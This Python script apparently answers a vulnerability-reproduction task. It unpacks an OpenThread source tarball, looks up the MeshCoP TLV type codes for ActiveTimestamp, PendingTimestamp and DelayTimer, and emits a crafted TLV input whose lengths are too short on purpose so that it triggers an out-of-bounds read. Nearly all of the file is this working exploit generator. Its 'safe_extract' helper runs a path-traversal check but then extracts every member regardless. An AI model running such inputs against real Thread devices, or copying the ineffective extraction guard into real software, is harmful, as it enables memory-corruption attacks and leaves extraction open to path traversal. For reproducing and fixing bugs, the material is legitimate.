import os
import re
import tarfile
import tempfile


def _remove_comments(text: str) -> str:
    text = re.sub(r'/\*.*?\*/', '', text, flags=re.S)
    text = re.sub(r'//.*', '', text)
    return text


def _parse_enums_for_types(text: str) -> dict:
    """
    Parse C/C++ enum blocks and try to map enumerator names to their integer values.
    Returns a dict of enumerator name -> int value.
    """
    text_nc = _remove_comments(text)
    enums = {}
    # Match enum, enum class, etc. with body inside braces
    for m in re.finditer(r'enum(?:\s+(?:class|struct))?\s*[^{]*\{(.*?)\}', text_nc, flags=re.S):
        body = m.group(1)
        # Split by commas at top-level (very rough, but should work for simple enums)
        parts = body.split(',')
        current_value = 0
        have_value = False
        for part in parts:
            p = part.strip()
            if not p:
                continue
            # Remove possible trailing attributes or comments (already removed)
            # Extract name and optional assigned value
            # Handle cases like: kFoo = 0x12, or kBar = SOME_MACRO (skip non-numeric)
            m2 = re.match(r'^([A-Za-z_]\w*)\s*(?:=\s*([^,\}]+))?$', p)
            if not m2:
                continue
            name, val = m2.group(1), m2.group(2)
            if val is not None:
                val_s = val.strip()
                # Try to parse integer literal (hex/dec)
                try:
                    # Remove possible casts or suffixes by taking leading numeric/hex token
                    mnum = re.match(r'^(0x[0-9A-Fa-f]+|\d+)', val_s)
                    if mnum:
                        current_value = int(mnum.group(1), 0)
                        have_value = True
                    else:
                        # Not a numeric literal, skip assigning numeric value update
                        # Keep current_value as is; we cannot resolve macros here.
                        # To avoid wrong sequence, we won't update current_value in this case.
                        pass
                except Exception:
                    pass
            enums[name] = current_value if have_value else enums.get(name, None)
            # Increment for next enumerator only if we have a numeric base
            if have_value:
                current_value += 1
    return enums


def _search_direct_assignments(text: str, names):
    """
    Look for direct assignments like kActiveTimestamp = 0x51
    Returns dict name -> int if found.
    """
    text_nc = _remove_comments(text)
    out = {}
    for name in names:
        # Try kActiveTimestamp = value
        m = re.search(r'\b' + re.escape(name) + r'\s*=\s*(0x[0-9A-Fa-f]+|\d+)', text_nc)
        if m:
            try:
                out[name] = int(m.group(1), 0)
            except Exception:
                pass
    return out


def _find_type_codes(root_dir: str) -> dict:
    """
    Find MeshCoP TLV type codes for ActiveTimestamp, PendingTimestamp, DelayTimer.
    Returns mapping short names to integers:
      {"ActiveTimestamp": int, "PendingTimestamp": int, "DelayTimer": int}
    """
    target_enum_names = {
        "ActiveTimestamp": ["kActiveTimestamp", "ActiveTimestamp", "ActiveTimestampTlv"],
        "PendingTimestamp": ["kPendingTimestamp", "PendingTimestamp", "PendingTimestampTlv"],
        "DelayTimer": ["kDelayTimer", "DelayTimer", "DelayTimerTlv"],
    }

    # Accumulate potential mappings from enums and direct assignments
    found = {}
    # To prioritize more specific matches (meshcop/dataset related files)
    candidate_files = []

    for dirpath, _, filenames in os.walk(root_dir):
        for fn in filenames:
            if not fn.lower().endswith(('.h', '.hpp', '.hh', '.hxx', '.c', '.cc', '.cpp', '.cxx', '.ipp', '.inl')):
                continue
            full = os.path.join(dirpath, fn)
            # Prioritize meshcop/dataset related files
            score = 0
            lfn = full.lower()
            if 'meshcop' in lfn:
                score += 3
            if 'dataset' in lfn:
                score += 2
            if 'tlv' in lfn:
                score += 2
            if 'openthread' in lfn or 'ot-' in lfn:
                score += 1
            candidate_files.append((score, full))

    # Sort files by score descending to inspect likely relevant ones first
    candidate_files.sort(key=lambda x: -x[0])

    # We'll limit how many files to parse deeply to keep performance reasonable
    max_files_to_parse = 800  # sufficiently large for typical repos
    parsed = 0

    enum_name_map = {}
    for _, path in candidate_files:
        if parsed >= max_files_to_parse:
            break
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                text = f.read()
        except Exception:
            continue
        parsed += 1

        # Direct assignments first
        for key, names in target_enum_names.items():
            direct = _search_direct_assignments(text, names)
            for nm, val in direct.items():
                if key not in found and val is not None:
                    # Assign
                    found[key] = val

        # Parse enums to build a name->value map
        enum_map = _parse_enums_for_types(text)
        # If we have values for our names, assign them
        for key, names in target_enum_names.items():
            if key in found:
                continue
            for nm in names:
                if nm in enum_map and enum_map[nm] is not None:
                    found[key] = enum_map[nm]
                    break

        if all(k in found for k in target_enum_names):
            break

    return found


def _encode_tlv(t: int, length: int, value_bytes: bytes) -> bytes:
    # Assume MeshCoP TLV format with 1-byte type, 1-byte length, followed by value
    # We ensure length matches value_bytes length
    if length != len(value_bytes):
        value_bytes = value_bytes[:length].ljust(length, b'\x00')
    return bytes((t & 0xFF, length & 0xFF)) + value_bytes


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
        # Extract tarball
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                def is_within_directory(directory, target):
                    abs_directory = os.path.abspath(directory)
                    abs_target = os.path.abspath(target)
                    prefix = os.path.commonprefix([abs_directory, abs_target])
                    return prefix == abs_directory

                def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
                    for member in tar.getmembers():
                        member_path = os.path.join(path, member.name)
                        if not is_within_directory(path, member_path):
                            continue
                    tar.extractall(path, members, numeric_owner=numeric_owner)
                safe_extract(tf, tmpdir)
        except Exception:
            # If extraction fails, fallback to generating generic TLVs with common guesses
            tmpdir = None

        mapping = {}
        if tmpdir is not None:
            mapping = _find_type_codes(tmpdir)

        # Fallback guesses if not found in codebase (best-effort common MeshCoP assignments)
        # These guesses are based on common Thread MeshCoP TLV type allocations in practice.
        # If parsing succeeded, these will be overridden.
        guesses = {
            "ActiveTimestamp": 0x51,
            "PendingTimestamp": 0x52,
            "DelayTimer": 0x54,
        }
        for k, v in guesses.items():
            mapping.setdefault(k, v)

        # Build a TLV sequence intentionally under-length for the vulnerable TLVs.
        # We include all three with too-short lengths. Place ActiveTimestamp last to amplify OOB access.
        tlvs = []

        # PendingTimestamp: requires >= 8 bytes; provide 1 byte
        if "PendingTimestamp" in mapping:
            tlvs.append(_encode_tlv(mapping["PendingTimestamp"], 1, b'\x00'))

        # DelayTimer: requires >= 4 bytes; provide 1 byte
        if "DelayTimer" in mapping:
            tlvs.append(_encode_tlv(mapping["DelayTimer"], 1, b'\xff'))

        # Add some padding/benign TLV(s) with unknown types to mimic realistic dataset and reduce early rejects
        # Use types unlikely to collide with known ones and small lengths.
        # Even if ignored, they help structure the input.
        tlvs.append(_encode_tlv(0x01, 3, b'ABC'))
        tlvs.append(_encode_tlv(0x02, 5, b'HELLO'))

        # ActiveTimestamp: requires >= 8 bytes; provide 1 byte; put it at the end to maximize OOB read
        if "ActiveTimestamp" in mapping:
            tlvs.append(_encode_tlv(mapping["ActiveTimestamp"], 1, b'\x00'))

        data = b''.join(tlvs)

        # Ensure data is non-empty and not excessively small; optionally pad with no-op bytes (unknown TLVs)
        if len(data) < 9:
            data += _encode_tlv(0x7E, 4, b'DATA')

        return data